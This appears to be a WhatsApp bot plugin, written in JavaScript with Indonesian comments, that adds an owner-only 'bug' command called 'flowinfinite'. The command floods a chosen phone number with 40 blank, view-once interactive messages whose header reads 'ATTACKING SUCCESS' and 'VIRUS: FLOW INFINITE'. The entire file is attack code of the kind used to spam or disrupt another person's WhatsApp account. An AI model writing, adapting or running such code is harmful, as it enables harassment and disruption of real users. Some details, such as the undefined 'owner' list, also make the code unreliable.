import pkg from '@adiwajshing/baileys';
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = pkg;

// Misalkan ini adalah objek mess yang berisi pesan yang digunakan
const mess = {
  owner: 'Kamu tidak memiliki akses ini!',
  bugrespon: 'Pesan bug sedang diproses...',
  syntaxError: '*Syntax Error!*\n\n_Use : %command% Number_\n_Example : %command% 62xx_\n\nYumiella\nDolkness'
};

const handler = async (m, { conn, text, command }) => {
  // Memeriksa apakah input ada
  if (!text) return m.reply(mess.syntaxError.replace(/%command%/g, command));

  // Memproses nomor target
  const incTarget = text.replace(/[^0-9]/g, '');
  if (incTarget.startsWith('0')) return m.reply(mess.syntaxError.replace(/%command%/g, command));
  
  const target = incTarget + '@s.whatsapp.net';

  // Memeriksa apakah target adalah pemilik
  if (owner.includes(incTarget)) {
    return m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!');
  } else {
    m.reply(mess.bugrespon);
    
    // Mengirimkan pesan sebanyak 40 kali
    for (let i = 0; i < 40; i++) {
      await sendInvisibleMessage(conn, target, m);
      await sleep(500); // Menunggu 500ms antara pengiriman
    }
  }
};

// Fungsi untuk mengirim pesan interaktif yang tidak terlihat
async function sendInvisibleMessage(conn, target, m) {
  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            forwardingScore: 999,
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: '', // Teks kosong untuk pesan tidak terlihat
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "©Yumiella Dolkness𒅒",
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗟𝗢𝗪 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
            hasMediaAttachment: true,
            ...(await prepareWAMessageMedia({
              image: {
                url: 'https://files.catbox.moe/aag3cg.jpg', // Ganti dengan URL gambar yang diinginka
              },
            }, {
              upload: conn.waUploadToServer,
            }))
          }),
        }),
      },
    },
  }, {});

  await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}

// Fungsi untuk menunggu
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Pengaturan handler
handler.command = /^flowinfinite$/i;
handler.help = ['flowinfinite <nomor>'];
handler.tags = ['bug'];
handler.owner = true;

export default handler;